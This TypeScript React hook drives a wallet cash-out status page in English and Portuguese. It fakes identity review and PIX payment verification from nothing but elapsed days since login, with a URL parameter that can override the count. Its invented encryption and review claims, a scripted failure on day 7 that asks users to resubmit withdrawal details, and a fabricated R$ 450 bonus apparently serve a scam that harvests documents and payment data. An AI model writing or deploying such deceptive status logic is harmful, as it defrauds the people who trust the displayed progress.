import { useMemo } from "react";

export type DocStatus = "under_review" | "approved";
export type CashoutStatus = "processing" | "completed" | "failed";
export type ReviewStage = "doc_received" | "doc_reviewing" | "doc_approved" | "bank_verifying" | "bank_failed" | "bank_completed";

export interface TimelineStep {
  id: ReviewStage;
  label: string;
  description: string;
}

export interface ActivityEvent {
  id: string;
  label: string;
  description: string;
  icon: "shield" | "check" | "alert" | "clock" | "bank" | "refresh" | "gift";
  timestamp: string;
}

interface WalletStatus {
  docStatus: DocStatus;
  docLabel: string;
  docColor: "warning" | "success";
  cashoutStatus: CashoutStatus;
  cashoutLabel: string;
  cashoutColor: "warning" | "destructive";
  daysSinceLogin: number;
  currentStage: ReviewStage;
  timeline: TimelineStep[];
  activities: ActivityEvent[];
  needsReverification: boolean;
  estimatedCompletion: string;
  hasBonus: boolean;
}

const TIMELINE_STEPS: TimelineStep[] = [
  { id: "doc_received", label: "Documents received", description: "Your documents were submitted and encrypted" },
  { id: "doc_reviewing", label: "Identity review", description: "Our team is reviewing your identity documents" },
  { id: "doc_approved", label: "Identity approved", description: "Your identity was successfully verified" },
  { id: "bank_verifying", label: "Verificação PIX", description: "Verifying your PIX key with our payment processor" },
  { id: "bank_failed", label: "PIX verification failed", description: "We couldn't verify your PIX key. Please enter it again." },
  { id: "bank_completed", label: "Funds ready", description: "Your account is fully verified and your funds are ready to withdraw" },
];

export function useWalletStatus(refreshKey?: number): WalletStatus {
  return useMemo(() => {
    const ts = localStorage.getItem("wallet_login_ts");
    const daysSinceLogin = ts
      ? Math.floor((Date.now() - Number(ts)) / (1000 * 60 * 60 * 24))
      : 0;

    const params = new URLSearchParams(window.location.search);
    const overrideDays = params.get("days");
    const days = overrideDays !== null ? Number(overrideDays) : daysSinceLogin;

    const docApproved = days >= 3;
    const cashoutFailed = days >= 7;
    const cashoutCompleted = days >= 5 && days < 7;

    const hasBonus = localStorage.getItem("reverification_bonus") === "true";

    // Determine current stage in timeline
    let currentStage: ReviewStage;
    if (days < 1) currentStage = "doc_received";
    else if (days < 3) currentStage = "doc_reviewing";
    else if (days < 5) currentStage = "bank_verifying";
    else if (cashoutFailed) currentStage = "bank_failed";
    else if (cashoutCompleted) currentStage = "bank_completed";
    else currentStage = "doc_approved";

    // Build activity feed based on days elapsed
    const activities: ActivityEvent[] = [];

    activities.push({
      id: "evt_encrypt",
      label: "Documents encrypted and stored",
      description: "Your 3 documents were protected with end-to-end encryption",
      icon: "shield",
      timestamp: "Dia 0",
    });

    if (days >= 1) {
      activities.push({
        id: "evt_review_start",
        label: "Identity review started",
        description: "The automated verification system started processing your documents",
        icon: "clock",
        timestamp: "Dia 1",
      });
    }

    if (days >= 3) {
      activities.push({
        id: "evt_doc_approved",
        label: "Identity verified",
        description: "Your identity documents passed the required checks",
        icon: "check",
        timestamp: "Dia 3",
      });
    }

    if (days >= 4) {
      activities.push({
        id: "evt_bank_start",
        label: "PIX verification started",
        description: "Our payment processor started verifying your PIX key",
        icon: "bank",
        timestamp: "Dia 4",
      });
    }

    if (cashoutFailed) {
      activities.push({
        id: "evt_bank_failed",
        label: "PIX verification failed",
        description: "Your PIX key could not be verified. Please enter your withdrawal details again.",
        icon: "alert",
        timestamp: "Dia 7",
      });
    } else if (cashoutCompleted) {
      activities.push({
        id: "evt_bank_done",
        label: "PIX verification completed",
        description: "Your PIX key is verified and ready to use",
        icon: "check",
        timestamp: "Dia 5",
      });
    }

    if (hasBonus) {
      activities.unshift({
        id: "evt_bonus",
        label: "Compensation bonus credited",
        description: "A R$ 450.00 bonus was added to your balance due to the verification delay",
        icon: "gift",
        timestamp: "Today",
      });
    }

    // Estimate completion
    let estimatedCompletion: string;
    if (cashoutFailed) {
      estimatedCompletion = "Awaiting re-verification";
    } else if (cashoutCompleted) {
      estimatedCompletion = "Completed";
    } else if (days >= 3) {
      const remaining = Math.max(1, 7 - days);
      estimatedCompletion = `~${remaining} day${remaining > 1 ? "s" : ""} remaining${remaining > 1 ? "s" : ""}`;
    } else {
      estimatedCompletion = "~5–7 days remaining";
    }

    return {
      daysSinceLogin: days,
      docStatus: docApproved ? "approved" : "under_review",
      docLabel: docApproved ? "Documents approved" : "Documents under review",
      docColor: docApproved ? "success" : "warning",
      cashoutStatus: cashoutFailed ? "failed" : cashoutCompleted ? "completed" : "processing",
      cashoutLabel: cashoutFailed
        ? "Failed - PIX verification required"
        : cashoutCompleted
        ? "Verified and ready"
        : "Processing (3–5 business days)",
      cashoutColor: cashoutFailed ? "destructive" : "warning",
      currentStage,
      timeline: TIMELINE_STEPS,
      activities,
      needsReverification: cashoutFailed,
      estimatedCompletion,
      hasBonus,
    };
  }, [refreshKey]);
}
